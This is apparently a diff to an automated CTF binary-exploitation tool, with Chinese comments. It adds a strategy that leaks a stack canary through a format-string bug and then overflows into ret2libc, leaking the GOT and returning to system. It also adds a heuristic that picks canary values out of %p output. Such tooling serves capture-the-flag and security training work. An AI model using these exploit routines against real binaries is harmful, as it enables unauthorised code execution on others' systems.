@@ -406,6 +406,60 @@ def s_ret2syscall_write(ch: Challenge, f: Facts) -> Iterable[Plan]:
                        f"gets({hex(bss)}) -> main -> execve off={off}")
 
 
+# --------------------------------------------------------------------------- 7b. canary + fmt 泄漏 + ret2libc
+def s_canary_fmt(ch: Challenge, f: Facts) -> Iterable[Plan]:
+    """`gets(buf); printf(buf); gets(buf);` 这类题：先用格式化字符串泄漏 canary，
+    再溢出到 ret2libc（泄漏 GOT -> 回 main -> system）。"""
+    if not f.fmt_buf or not ch.prot.canary or ch.elf.pie:
+        return
+    leak_plt = ch.plt("puts") or ch.plt("write")
+    if not leak_plt:
+        return
+    got = ch.got("puts") or ch.got("write")
+    main = ch.var("main")
+    if not got or not main:
+        return
+    for off, sink in _offsets(ch, f):
+        if sink not in TERM_SINKS and sink != "read":
+            continue
+        yield Plan("canary_fmt", [], tag=f"canary:{off}:{sink}",
+                   desc=f"fmt leak canary -> ret2libc off={off}")
+
+
+def _canary_candidates(out: bytes, bits: int) -> list[int]:
+    """从 %p 回显里挑 canary 候选：低字节必须是 0x00。
+
+    越靠后的参数越可能是 canary（canary 位于缓冲区之后的帧内），所以按索引倒序返回。
+    """
+    text = out.decode("latin-1", "ignore")
+    vals = []
+    indexed = []
+    for idx, tok in enumerate(re.findall(r"0x[0-9a-fA-F]+", text)):
+        try:
+            v = int(tok, 16)
+        except Exception:
+            continue
+        if v == 0 or (v & 0xFF) != 0:
+            continue           # canary 最低字节固定为 0x00
+        if bits == 32 and not (0x100 <= v <= 0xFFFFFFFF):
+            continue
+        if bits == 64 and not (0x100 <= v < (1 << 56)):
+            continue
+        # 排除明显的栈/库/堆地址与页对齐值
+        if bits == 32 and (v >> 24) in (0xFF, 0xF7, 0xF6, 0x80, 0x08, 0x60):
+            continue
+        if v % 0x1000 == 0:
+            continue
+        indexed.append((idx, v))
+    indexed.sort(key=lambda x: -x[0])
+    seen, out2 = set(), []
+    for _, v in indexed:
+        if v not in seen:
+            seen.add(v)
+            out2.append(v)
+    return out2
+
+
 # --------------------------------------------------------------------------- 8. printf(user) -> GOT 覆盖
 def s_fmtstr(ch: Challenge, f: Facts) -> Iterable[Plan]:
     if not f.fmt_buf:
@@ -468,6 +522,7 @@ STRATEGIES = [
     s_ret2plt,
     s_ret2gets,
     s_ret2csu,
+    s_canary_fmt,
     s_ret2libc_write,
     s_ret2libc,
     s_shellcode,
